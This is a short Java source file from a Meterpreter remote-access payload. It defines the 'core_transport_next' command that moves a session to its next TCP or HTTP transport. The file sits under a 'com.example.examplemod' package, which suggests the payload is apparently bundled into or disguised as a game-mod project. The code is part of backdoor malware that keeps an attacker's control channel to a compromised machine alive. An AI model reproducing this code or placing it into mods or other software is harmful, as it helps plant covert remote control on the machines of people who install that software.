package com.example.examplemod.meterpreter.core;

import com.example.examplemod.meterpreter.Meterpreter;
import com.example.examplemod.meterpreter.TLVPacket;
import com.example.examplemod.meterpreter.TLVType;
import com.example.examplemod.meterpreter.Transport;
import com.example.examplemod.meterpreter.TcpTransport;
import com.example.examplemod.meterpreter.HttpTransport;
import com.example.examplemod.meterpreter.Utils;
import com.example.examplemod.meterpreter.command.Command;

public class core_transport_next implements Command {

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        meterpreter.getTransports().setNext(meterpreter.getTransports().current().getNext(), 0);

        return EXIT_DISPATCH;
    }
}

